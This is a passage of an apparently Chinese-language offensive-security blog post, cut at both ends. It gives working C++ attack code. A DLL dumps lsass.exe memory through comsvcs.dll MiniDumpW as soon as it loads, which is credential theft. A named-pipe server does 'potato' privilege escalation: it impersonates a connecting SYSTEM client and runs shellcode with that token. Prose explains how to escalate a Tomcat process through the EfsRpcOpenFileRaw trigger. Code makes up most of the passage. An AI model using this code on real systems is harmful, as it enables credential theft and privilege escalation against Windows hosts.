</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">127
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// dllmain.cpp : 定义 DLL 应用程序的入口点。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;pch.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;DbgHelp.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;TlHelp32.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment( lib, &#34;Dbghelp.lib&#34; )
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define _CRT_SECURE_NO_WARNINGS
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>HRESULT</span>(WINAPI<span style=color:#f92672>*</span> _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BOOL <span style=color:#a6e22e>CheckPrivilege</span>() {
</span></span><span style=display:flex><span>    BOOL state;
</span></span><span style=display:flex><span>    SID_IDENTIFIER_AUTHORITY NtAuthority <span style=color:#f92672>=</span> SECURITY_NT_AUTHORITY;
</span></span><span style=display:flex><span>    PSID AdministratorsGroup;
</span></span><span style=display:flex><span>   
</span></span><span style=display:flex><span>    state <span style=color:#f92672>=</span> AllocateAndInitializeSid(
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;</span>NtAuthority,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>        SECURITY_BUILTIN_DOMAIN_RID,
</span></span><span style=display:flex><span>        DOMAIN_ALIAS_RID_ADMINS,
</span></span><span style=display:flex><span>        SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS,<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;</span>AdministratorsGroup);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (state)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>CheckTokenMembership(NULL, AdministratorsGroup, <span style=color:#f92672>&amp;</span>state))
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            state <span style=color:#f92672>=</span> FALSE;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        FreeSid(AdministratorsGroup);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> state;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BOOL <span style=color:#a6e22e>EnableDebugPrivilege</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    HANDLE hThis <span style=color:#f92672>=</span> GetCurrentProcess();
</span></span><span style=display:flex><span>    HANDLE hToken;
</span></span><span style=display:flex><span>    OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, <span style=color:#f92672>&amp;</span>hToken);
</span></span><span style=display:flex><span>    LUID luid;
</span></span><span style=display:flex><span>    LookupPrivilegeValue(<span style=color:#ae81ff>0</span>, TEXT(<span style=color:#e6db74>&#34;seDebugPrivilege&#34;</span>), <span style=color:#f92672>&amp;</span>luid);
</span></span><span style=display:flex><span>    TOKEN_PRIVILEGES priv;
</span></span><span style=display:flex><span>    priv.PrivilegeCount <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    priv.Privileges[<span style=color:#ae81ff>0</span>].Luid <span style=color:#f92672>=</span> luid;
</span></span><span style=display:flex><span>    priv.Privileges[<span style=color:#ae81ff>0</span>].Attributes <span style=color:#f92672>=</span> SE_PRIVILEGE_ENABLED;
</span></span><span style=display:flex><span>    BOOL isEnabiled <span style=color:#f92672>=</span> AdjustTokenPrivileges(hToken, false, <span style=color:#f92672>&amp;</span>priv, <span style=color:#66d9ef>sizeof</span>(priv), <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (isEnabiled) {
</span></span><span style=display:flex><span>        CloseHandle(hToken);
</span></span><span style=display:flex><span>        CloseHandle(hThis);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> FALSE;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DWORD <span style=color:#a6e22e>GetLsassPID</span>() {
</span></span><span style=display:flex><span>    DWORD lsassPID <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    HANDLE snapshot <span style=color:#f92672>=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    PROCESSENTRY32 processEntry <span style=color:#f92672>=</span> {};
</span></span><span style=display:flex><span>    processEntry.dwSize <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(PROCESSENTRY32);
</span></span><span style=display:flex><span>    LPCWSTR processName <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>//遍历lsass.exe 的PID
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (Process32First(snapshot, <span style=color:#f92672>&amp;</span>processEntry)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (_wcsicmp(processName, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;lsass.exe&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            Process32Next(snapshot, <span style=color:#f92672>&amp;</span>processEntry);
</span></span><span style=display:flex><span>            processName <span style=color:#f92672>=</span> processEntry.szExeFile;
</span></span><span style=display:flex><span>            lsassPID <span style=color:#f92672>=</span> processEntry.th32ProcessID;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> lsassPID;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BOOL <span style=color:#a6e22e>CheckFileExists</span>(PWCHAR file) {
</span></span><span style=display:flex><span>    WIN32_FIND_DATA FindFileData;
</span></span><span style=display:flex><span>    HANDLE hFind <span style=color:#f92672>=</span> FindFirstFileEx(file, FindExInfoStandard, <span style=color:#f92672>&amp;</span>FindFileData,FindExSearchNameMatch, NULL, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (hFind <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> FALSE;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>Dump</span>() {
</span></span><span style=display:flex><span>    WCHAR commandLine[MAX_PATH];
</span></span><span style=display:flex><span>    WCHAR DumpFile[] <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Temp</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>111.sql&#34;</span>;
</span></span><span style=display:flex><span>    _MiniDumpW MiniDumpW;
</span></span><span style=display:flex><span>    DWORD lsassPID <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>CheckPrivilege()) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>EnableDebugPrivilege()) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>   
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (CheckFileExists(DumpFile)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    lsassPID <span style=color:#f92672>=</span> GetLsassPID();
</span></span><span style=display:flex><span>    MiniDumpW <span style=color:#f92672>=</span> (_MiniDumpW)GetProcAddress(LoadLibrary(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;comsvcs.dll&#34;</span>), <span style=color:#e6db74>&#34;MiniDumpW&#34;</span>);
</span></span><span style=display:flex><span>    _itow_s(lsassPID, commandLine, <span style=color:#ae81ff>10</span>);
</span></span><span style=display:flex><span>    lstrcatW(commandLine, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34; &#34;</span>);
</span></span><span style=display:flex><span>    lstrcatW(commandLine, DumpFile);
</span></span><span style=display:flex><span>    lstrcatW(commandLine, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34; full&#34;</span>);
</span></span><span style=display:flex><span>    MiniDumpW(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, commandLine);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>( HMODULE hModule,
</span></span><span style=display:flex><span>                       DWORD  ul_reason_for_call,
</span></span><span style=display:flex><span>                       LPVOID lpReserved
</span></span><span style=display:flex><span>                     )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (ul_reason_for_call)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
</span></span><span style=display:flex><span>        Dump();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>首先判断权限是否是管理员或者SYSTEM权限，然后尝试启用SE_DEBUG权限，最后才进行转储，代码我上传到了Github仓库：<a href=https://github.com/Rvn0xsy/j2osWin>https://github.com/Rvn0xsy/j2osWin</a></p><h2 id=0x06-将java进程进行权限提升>0x06 将Java进程进行权限提升</h2><p>Tomcat 有三种权限运行模式：</p><p><img src=https://images.payloads.online/2022-08-11-22-07-36.png alt></p><p>● Local Service
● Network Service
● Users
默认安装好的Tomcat会自动运行在Local Service账户下，意味着权限很低，如果目标安装了数字杀毒，就更加难以实现提权。</p><p>解决办法：</p><ol><li>利用System.LoadLibrary技术在Tomcat本身进程种执行任意代码</li><li>利用执行任意代码的特点来进行土豆提权</li><li>利用模拟Token创建执行Shellcode的线程，所有的交互通过Webshell与系统管道通信实现</li></ol><h3 id=0x061-efsrpcopenfileraw-提权>0x06.1 EfsRpcOpenFileRaw 提权</h3><p>土豆提权的原理：在Windows操作系统中，如果当前账户是Local Service/Network Service，那么大部分情况下会有一个令牌模拟的权限，当高权限连接到Service账户开启的服务时，Service账户就可以通过令牌模拟获取客户端的权限来执行任意代码。</p><p>注意：令牌模拟仅是将当前线程的Token进行临时替换为客户端的令牌，其次，土豆提权仅限于本地操作系统才能工作，域内一般发起请求的都是域账户，或有同一账户体系的可信网络内。</p><p>土豆提权中有一个关于<a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8>MS-EFSR</a> RPC接口的利用方式，通过创建一个命名管道，然后调用EfsRpcOpenFileRaw让SYSTEM特权账户连接到命名管道实现提权。<a href=https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs>@zcgonvh</a> 公开了一个C#的利用代码，并且我还请教了他，这里感谢头像哥的解答。</p><p>创建命名管道部分实现代码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>InitializeSecurityDescriptor(<span style=color:#f92672>&amp;</span>sd, SECURITY_DESCRIPTOR_REVISION))
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;InitializeSecurityDescriptor() failed. Error: %d - &#34;</span>, GetLastError());
</span></span><span style=display:flex><span>		LocalFree(pwszPipeName);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置安全描述符
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>ConvertStringSecurityDescriptorToSecurityDescriptorW(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;D:(A;OICI;GA;;;WD)&#34;</span>, <span style=color:#ae81ff>1</span>, <span style=color:#f92672>&amp;</span>((<span style=color:#f92672>&amp;</span>sa)<span style=color:#f92672>-&gt;</span>lpSecurityDescriptor), NULL))
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, GetLastError());
</span></span><span style=display:flex><span>		LocalFree(pwszPipeName);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建管道
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hPipe <span style=color:#f92672>=</span> CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX <span style=color:#f92672>|</span> FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE <span style=color:#f92672>|</span> PIPE_WAIT, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>2048</span>, <span style=color:#ae81ff>2048</span>, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>sa);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (hPipe <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] NamedPipe &#39;%ls&#39; listening...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pwszPipeName);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 一直等待客户端连接，方便持续调用
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>for</span> (;;) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (ConnectNamedPipe(hPipe, NULL) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>			wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[+] A client connected!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>			<span style=color:#75715e>// 模拟客户端Token
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>ImpersonateNamedPipeClient(hPipe)) {
</span></span><span style=display:flex><span>				<span style=color:#75715e>// 如果无法模拟就断开连接
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>				DisconnectNamedPipe(hPipe);
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>continue</span>;
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			GetUserName(szUser, <span style=color:#f92672>&amp;</span>dwSize);
</span></span><span style=display:flex><span>			wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[+] Impersonating dummy :) : %s</span><span style=color:#ae81ff>\n\n\n\n</span><span style=color:#e6db74>&#34;</span>, szUser);
</span></span><span style=display:flex><span>			<span style=color:#75715e>// 将特权Token赋值到全局变量中
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, <span style=color:#f92672>&amp;</span>g_hSystemToken);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (g_ShellcodeBuffer <span style=color:#f92672>!=</span> NULL <span style=color:#f92672>&amp;&amp;</span> g_dwShellcodeSize <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>				<span style=color:#75715e>// 如果Shellcode不为空，就开始创建线程执行
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>				ExecuteShellCodeWithToken(g_hSystemToken);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			DisconnectNamedPipe(hPipe);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span></code></pre></td></tr></table></div></div><p>触发RPC连接实现代码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
